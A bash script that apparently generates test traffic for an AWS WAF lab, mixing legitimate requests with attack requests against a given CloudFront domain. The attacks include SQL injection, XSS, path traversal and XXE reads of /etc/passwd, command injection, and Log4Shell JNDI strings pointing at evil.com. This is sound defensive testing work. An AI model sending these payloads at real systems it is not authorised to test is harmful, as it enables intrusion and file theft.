#!/usr/bin/env bash
#
# Generate mixed legitimate + malicious traffic against a CloudFront distribution
# protected by AWS WAF. Designed to produce rich WAF log records.
#
# Usage:
#   ./generate-traffic.sh <cloudfront-domain> [rounds]
#
# Examples:
#   ./generate-traffic.sh d1234abcdef.cloudfront.net
#   ./generate-traffic.sh d1234abcdef.cloudfront.net 20
#
set -euo pipefail

DOMAIN="${1:?Usage: $0 <cloudfront-domain> [rounds]}"
ROUNDS="${2:-10}"
BASE="https://${DOMAIN}"

echo "=== WAF Lab Traffic Generator ==="
echo "Target:  ${BASE}"
echo "Rounds:  ${ROUNDS}"
echo ""

send() {
  local label="$1"; shift
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$@" 2>/dev/null || echo "ERR")
  printf "  %-12s %s %s\n" "[${code}]" "${label}" "$1"
}

for i in $(seq 1 "$ROUNDS"); do
  echo "--- Round ${i}/${ROUNDS} ---"

  # ---- Legitimate traffic ----
  send "legit-index"     "${BASE}/"
  send "legit-health"    "${BASE}/api/health"
  send "legit-users"     "${BASE}/api/users"
  send "legit-search"    "${BASE}/api/users?q=alice&page=1"
  send "legit-static"    "${BASE}/index.html"
  send "legit-options"   "${BASE}/api/health" -X OPTIONS -H "Origin: https://example.com"

  # ---- SQL Injection attempts ----
  send "sqli-param"      "${BASE}/api/users?id=1%20OR%201=1"
  send "sqli-union"      "${BASE}/api/users?id=1%20UNION%20SELECT%20*%20FROM%20users--"
  send "sqli-param2"     "${BASE}/api/users?name=admin'%20OR%20'1'='1"
  send "sqli-body"       "${BASE}/api/users" -X POST -d "username=admin&password=' OR 1=1 --"

  # ---- XSS attempts ----
  send "xss-query"       "${BASE}/search?q=<script>alert(1)</script>"
  send "xss-param"       "${BASE}/api/users?name=<img%20src=x%20onerror=alert(1)>"
  send "xss-header"      "${BASE}/" -H "Referer: <script>alert('xss')</script>"

  # ---- Path traversal / LFI ----
  send "lfi-etc"         "${BASE}/../../etc/passwd"
  send "lfi-dotdot"      "${BASE}/api/../../../etc/shadow"
  send "lfi-null"        "${BASE}/api/users?file=../../../etc/passwd%00"

  # ---- Log4Shell / JNDI ----
  send "log4j-header"    "${BASE}/" -H "X-Api-Key: \${jndi:ldap://evil.com/a}"
  send "log4j-ua"        "${BASE}/" -H "User-Agent: \${jndi:rmi://evil.com/exploit}"
  send "log4j-param"     "${BASE}/api/users?search=\${jndi:ldap://evil.com/x}"

  # ---- Command injection ----
  send "cmdi-param"      "${BASE}/api/health?cmd=;cat%20/etc/passwd"
  send "cmdi-pipe"       "${BASE}/api/health?input=|ls%20-la"

  # ---- Suspicious user agents ----
  send "ua-nikto"        "${BASE}/" -H "User-Agent: Nikto/2.1.6"
  send "ua-sqlmap"       "${BASE}/" -H "User-Agent: sqlmap/1.7"
  send "ua-nmap"         "${BASE}/" -H "User-Agent: Nmap Scripting Engine"
  send "ua-dirbuster"    "${BASE}/" -H "User-Agent: DirBuster-1.0-RC1"

  # ---- Oversized / malformed ----
  send "big-header"      "${BASE}/" -H "X-Big: $(head -c 8192 /dev/urandom | base64 | tr -d '\n' | head -c 8000)"
  send "bad-method"      "${BASE}/" -X TRACE
  send "bad-proto"       "${BASE}/api/users" -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

  # ---- Legitimate again (simulate real user interleaved) ----
  send "legit-page2"     "${BASE}/api/users?page=2&limit=25"
  send "legit-post"      "${BASE}/api/users" -X POST -H "Content-Type: application/json" -d '{"name":"charlie","email":"c@example.com"}'

  sleep 1
done

echo ""
echo "=== Done: ${ROUNDS} rounds of mixed traffic sent ==="
echo ""
echo "Next steps:"
echo "  1. Wait 1-2 minutes for WAF logs to be delivered via Firehose"
echo "  2. Check your Rawtree table or firehose-stub for ingested records"
echo ""
echo "For heavier attack traffic, also run GoTestWAF:"
echo "  docker run --rm wallarm/gotestwaf --url ${BASE} --skipWAFBlockCheck"
